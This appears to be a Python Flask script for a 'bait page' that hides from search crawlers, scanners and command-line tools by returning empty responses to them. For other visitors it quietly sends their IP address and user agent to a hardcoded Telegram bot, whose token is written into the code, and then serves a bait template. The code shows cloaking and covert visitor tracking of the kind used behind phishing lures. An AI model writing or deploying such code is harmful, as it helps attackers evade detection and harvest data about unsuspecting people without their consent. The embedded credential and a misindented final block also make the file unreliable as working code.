from flask import Flask, request, render_template
import requests

app = Flask(__name__)

BOT_TOKEN = "7590817261:AAGL6vH2hi4NPd9x1Iikaqlk40p5xxQ0cBc"
CHAT_ID = "6908281054"

# 🔒 Full List of bots to silently block
bot_keywords = [
    "google", "bot", "crawl", "spider", "archive", "slurp",
    "bing", "facebook", "Headless", "python", "curl", "wget",
    "Go-http-client", "axios", "postman", "scan", "nmap", "node"
]

def is_bot(user_agent):
    return any(bot in user_agent.lower() for bot in bot_keywords)

def send_to_telegram(msg):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": msg}
        )
    except:
        pass

@app.route('/')
def bait_page():
    ua = request.headers.get('User-Agent', '')
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ref = request.headers.get("Referer", "")

    # 🛑 Block all known bots silently
    if is_bot(ua) or any(s in ref for s in ['google.', 'bing.', 'yahoo.', 'duckduckgo.']):
        return "", 204  # No Content

    # ✅ Real User Detected
    send_to_telegram(f"🎯 *Trap Hit!*\n🌐 IP: {ip}\n📱 UA: {ua}")
    return render_template('bait.html')
  if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
